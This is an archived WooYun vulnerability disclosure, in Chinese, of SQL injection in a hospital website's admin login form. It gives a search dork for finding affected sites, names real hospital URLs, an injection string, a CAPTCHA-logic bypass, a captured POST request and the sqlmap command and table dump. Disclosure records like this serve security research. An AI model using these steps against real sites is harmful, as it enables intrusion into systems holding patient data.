{"id": 52692, "wybug_id": "wooyun-2014-070444", "wybug_title": "某医院系统登录框过滤不严至SQL注入", "wybug_corp": "台州华顶网络技术有限公司", "wybug_author": "冰火九天", "wybug_date": "2014-07-31 18:22", "wybug_open_date": "2014-10-29 18:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向公众公开  简要描述： 此漏洞可批量可工具，而且是医院，医患隐私暴露无遗，危害大大的 详细说明：  关键字：inurl:info.aspx?Code= 搜这个还是百度给力根目录加/admin/index.aspx进入后台登陆界面就以百度搜的前三个为例http://www.312000.net/admin/index.aspx 登录框输入'and @@version>0;--\n\nhttp://www.dyhospital.com/admin/index.aspx 登录框输入'and @@version>0;--\n\nhttp://www.wlsph.com/admin/index.aspx 登录框输入'and @@version>0;--\n\n   漏洞证明：  手工太麻烦，能不能工具呢，答案是肯定的在测试的过程中惊奇地发现验证码的刷新存在逻辑错误只有当用户名密码出错时才会刷新，而sql出错在此之前，故验证码形同虚设咱拿出神器burp截包扔到sqlmap里自己跑以另一个网站www.yh2y.com为例\nPOST /admin/index.aspx HTTP/1.1Host: www.yh2y.comUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.yh2y.com/admin/index.aspxCookie: ASP.NET_SessionId=3gnbef55yalfwgnnhupwhw45Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 333__VIEWSTATE=%2FwEPDwUIODc0NTc3OTdkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxJbWFnZUJ1dHRvbjG6wmES2RyPrFdj3PvMttbtRW7Ljg%3D%3D&username=1&password=1&verifycode=aD5u&ImageButton1.x=46&ImageButton1.y=11&__EVENTVALIDATION=%2FwEWBQL33o7nAQKvpuq2CALyveCRDwLy1ffTCgLSwpnTCNHrA%2BQO6xKud7Ino78iuuSy%2BcQz\n存为1.txtsqlmap -r '/root/Desktop/1.txt' --data \"username=1\" --current-db --current-user\n\n跑个表\nDatabase: yh2yy                                                                [42 tables]+--------------------------------+| AspxHospital_Admin             || AspxHospital_ArticlePermission || AspxHospital_ArticlePermission || AspxHospital_Bszn              || AspxHospital_Club              || AspxHospital_Comments          || AspxHospital_Device            || AspxHospital_Doc               || AspxHospital_DownLoad          || AspxHospital_Experts           || AspxHospital_Feeds             || AspxHospital_Group             || AspxHospital_Groups            || AspxHospital_Leader            || AspxHospital_Medical           || AspxHospital_Msg               || AspxHospital_Navigation        || AspxHospital_Navigation        || AspxHospital_Nsjg              || AspxHospital_Organization      || AspxHospital_PaperArticle      || AspxHospital_PaperLayout       || AspxHospital_PaperPanel        || AspxHospital_Permission        || AspxHospital_Price             || AspxHospital_ReserveLog        || AspxHospital_ReserveLog        || AspxHospital_Sections          || AspxHospital_Sort              || AspxHospital_Subject           || AspxHospital_Survey            || AspxHospital_SurveySubject     || AspxHospital_User              || AspxHospital_Zjeg              || Survey_Content                 || Survey_FromTable               || Survey_MainTable               || dtproperties                   || ec_guest                       || ec_news                        || ypcx                           || yydj                           |+--------------------------------+\n   修复方案：  1、登录框过滤2、注意验证码逻辑   版权声明：转载请注明来源 冰火九天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-08-05 09:30 厂商回复： CNVD未建立与软件生产厂商的处置联系渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}